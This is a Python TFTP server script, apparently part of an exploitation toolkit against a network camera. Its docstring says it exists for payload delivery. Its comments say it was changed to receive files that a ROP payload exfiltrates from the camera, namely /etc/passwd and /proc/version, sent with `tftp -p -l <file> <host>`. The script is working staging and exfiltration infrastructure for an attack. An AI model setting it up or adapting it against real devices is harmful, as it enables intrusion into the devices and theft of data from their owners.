#!/usr/bin/env python3
"""Minimal read-only TFTP server (RFC 1350, octet mode) for payload delivery.

The camera's busybox has `tftp` but no `nc`/`httpd`, so this is the only fetch
channel. Serves one directory, 512-byte blocks, and logs every request.

  tftp_serve.py --dir /tmp/tftp --bind 192.168.4.160
"""
import argparse
import os
import socket
import struct
import sys

RRQ, DATA, ACK, ERROR = 1, 3, 4, 5


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", default="/tmp/tftp")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=69)
    a = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((a.bind, a.port))
    print(f"tftp on {a.bind}:{a.port} dir={a.dir}", flush=True)

    while True:
        data, peer = srv.recvfrom(2048)
        if len(data) < 4 or struct.unpack(">H", data[:2])[0] not in (RRQ, 2):
            # opcode 2 = WRQ (camera uploads); RRQ = 1. The original filter only
            # accepted RRQ and silently dropped every WRQ — the C660 exfil path
            # (`tftp -p -l`) never had a receiver (measured 2026-11-05).
            continue
        # WRQ (opcode 2): the C660 ROP payload exfils /etc/passwd and /proc/version with
        # `tftp -p -l <file> <host>` — the old read-only server silently dropped every
        # upload, so system() execution on the camera had no observable ground truth.
        if struct.unpack(">H", data[:2])[0] == DATA and len(data) >= 4:
            continue  # stray DATA on port 69 without a WRQ handshake: ignore
        if data[:2] == bytes([0, 2]):
            name = data[2:].split(b"\x00")[0].decode(errors="replace")
            safe = os.path.basename(name).replace("..", "_")
            path = os.path.join(a.dir, safe)
            print(f"WRQ {name} from {peer} -> {path}", flush=True)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if a.bind != "0.0.0.0":
                sock.bind((a.bind, 0))
            sock.settimeout(3)
            # ACK the WRQ (block 0) to start the upload
            sock.sendto(struct.pack(">HH", ACK, 0), peer)
            expected = 1
            blob = bytearray()
            while True:
                try:
                    d, _ = sock.recvfrom(2048)
                except socket.timeout:
                    break
                if len(d) >= 4 and struct.unpack(">H", d[:2])[0] == DATA:
                    blk = struct.unpack(">H", d[2:4])[0]
                    if blk == expected:
                        blob += d[4:]
                        sock.sendto(struct.pack(">HH", ACK, blk), peer)
                        expected += 1
                        if len(d) < 516:
                            break
                    elif blk < expected:
                        sock.sendto(struct.pack(">HH", ACK, blk), peer)  # dup ACK
            if blob:
                open(path, "wb").write(blob)
                print(f"  received {len(blob)}B -> {path}", flush=True)
            sock.close()
            continue
        name = data[2:].split(b"\x00")[0].decode(errors="replace")
        path = os.path.join(a.dir, os.path.basename(name))
        print(f"RRQ {name} from {peer}", flush=True)
        if not os.path.isfile(path):
            srv.sendto(struct.pack(">HH", ERROR, 1) + b"not found\x00", peer)
            continue
        blob = open(path, "rb").read()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if a.bind != "0.0.0.0":
            sock.bind((a.bind, 0))   # data must come from the address the camera knows
        sock.settimeout(3)
        block = 1
        off = 0
        while True:
            chunk = blob[off:off + 512]
            pkt = struct.pack(">HH", DATA, block) + chunk
            for _ in range(5):
                sock.sendto(pkt, peer)
                try:
                    ack, _p = sock.recvfrom(1024)
                except socket.timeout:
                    continue
                if len(ack) >= 4 and struct.unpack(">H", ack[:2])[0] == ACK \
                        and struct.unpack(">H", ack[2:4])[0] == block:
                    break
            else:
                print(f"  block {block} unacked, giving up", flush=True)
                break
            off += 512
            block += 1
            if len(chunk) < 512:
                break
        sock.close()
        print(f"  sent {len(blob)}B in {block} blocks", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
